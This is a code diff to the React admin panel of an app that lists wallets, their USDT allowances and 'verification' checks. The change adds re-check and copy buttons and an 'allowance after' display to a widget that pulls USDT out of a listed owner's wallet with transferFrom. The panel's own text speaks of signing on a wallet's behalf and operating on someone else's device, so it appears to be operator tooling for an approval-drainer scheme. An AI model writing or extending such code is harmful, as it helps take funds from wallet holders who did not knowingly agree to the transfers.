@@ -10,6 +10,7 @@ import {
   deductUsdt,
   downloadAdminExport,
   getAdminSummary,
+  verifyAllowance,
   type AdminSummary,
   type VerificationRow,
   type WalletRow,
@@ -31,6 +32,7 @@ export function AdminPanel() {
   const [loading, setLoading] = useState(false)
   const [autoRefresh, setAutoRefresh] = useState(true)
   const [expanded, setExpanded] = useState<string | null>(null)
+  const [checking, setChecking] = useState<string | null>(null)
 
   const load = useCallback(async (authToken: string, forceRefresh = false) => {
     setLoading(true)
@@ -89,6 +91,20 @@ export function AdminPanel() {
     }
   }
 
+  /** Forces a fresh server-side allowance check for one wallet. */
+  async function recheck(owner: string) {
+    setChecking(owner)
+    setError(null)
+    try {
+      await verifyAllowance(owner)
+      await load(token, true)
+    } catch (err) {
+      setError(err instanceof Error ? err.message : 'Allowance check failed.')
+    } finally {
+      setChecking(null)
+    }
+  }
+
   if (!token) {
     return (
       <section>
@@ -130,6 +146,14 @@ export function AdminPanel() {
 
   return (
     <section>
+      {config.storage === 'memory' && (
+        <p className="warning">
+          Storage is in memory. Branding, events and allowance checks are wiped on every cold
+          start. Provision Upstash Redis, redeploy, and confirm <code>/api/health</code> reports
+          <code>redis</code>.
+        </p>
+      )}
+
       <div className="admin-head">
         <p className="hint">
           Updated {time(generatedAt)} · {totals.wallets} wallets · {totals.verifications} checks
@@ -202,8 +226,8 @@ export function AdminPanel() {
 
       <h2>Wallet tools</h2>
       <p className="hint">
-        Connect a wallet here to approve or revoke USDT. These controls are not shown on the
-        public page.
+        Connect a wallet here to approve, revoke or sign on its behalf. The same controls are also
+        on the public page; this copy is for operating on someone else&apos;s device.
       </p>
       <AccountPanel />
       <ApprovePanel />
@@ -234,7 +258,8 @@ export function AdminPanel() {
                     <td className="mono" title={wallet.owner}>
                       <a href={addressUrl(wallet.owner)} target="_blank" rel="noreferrer">
                         {short(wallet.owner)}
-                      </a>
+                      </a>{' '}
+                      <CopyButton value={wallet.owner} label="copy" />
                     </td>
                     <td>{wallet.allowance === null ? '—' : formatRaw(wallet.allowance)}</td>
                     <td>
@@ -245,6 +270,14 @@ export function AdminPanel() {
                     <td>{wallet.checks}</td>
                     <td>{time(wallet.lastCheckedAt)}</td>
                     <td>
+                      <button
+                        className="link"
+                        type="button"
+                        disabled={checking === wallet.owner}
+                        onClick={() => void recheck(wallet.owner)}
+                      >
+                        {checking === wallet.owner ? 'checking…' : 're-check'}
+                      </button>{' '}
                       <button
                         className="link"
                         type="button"
@@ -312,7 +345,8 @@ export function AdminPanel() {
                   <td className="mono">
                     <a href={txUrl(event.txId)} target="_blank" rel="noreferrer">
                       {short(event.txId)}
-                    </a>
+                    </a>{' '}
+                    <CopyButton value={event.txId} label="copy" />
                   </td>
                 </tr>
               ))}
@@ -489,6 +523,8 @@ function DeductWidget({
   const max = allowance < balance ? allowance : balance
   const parsed = parseDecimal(amount)
   const valid = parsed !== null && parsed > 0n && parsed <= max
+  const remaining = parsed !== null && parsed <= allowance ? allowance - parsed : allowance
+  const atMax = parsed !== null && parsed === max
 
   if (!canDeduct) {
     return (
@@ -577,6 +613,13 @@ function DeductWidget({
         </label>
       </div>
 
+      {valid && (
+        <p className="hint">
+          Allowance after: <strong>{formatTokenAmount(remaining)} USDT</strong>
+          {atMax ? ' (this empties the allowance)' : ''}
+        </p>
+      )}
+
       {stage === 'idle' ? (
         <button
           className="btn small"
@@ -591,6 +634,9 @@ function DeductWidget({
           <p>
             Send <strong>{formatTokenAmount(parsed!)} USDT</strong> from{' '}
             <code>{short(owner)}</code> to <code>{short(to.trim())}</code>?
+          </p>
+          <p className="hint">
+            Check the destination before confirming — a confirmed transferFrom cannot be undone.
           </p>
           <div className="row">
             <button className="btn small" type="button" onClick={() => void submit()} disabled={busy}>
@@ -619,6 +665,25 @@ function DeductWidget({
         </p>
       )}
     </div>
+  )
+}
+
+function CopyButton({ value, label }: { value: string; label: string }) {
+  const [done, setDone] = useState(false)
+
+  return (
+    <button
+      className="link"
+      type="button"
+      onClick={() => {
+        void navigator.clipboard.writeText(value).then(() => {
+          setDone(true)
+          window.setTimeout(() => setDone(false), 1200)
+        })
+      }}
+    >
+      {done ? 'copied' : label}
+    </button>
   )
 }
 
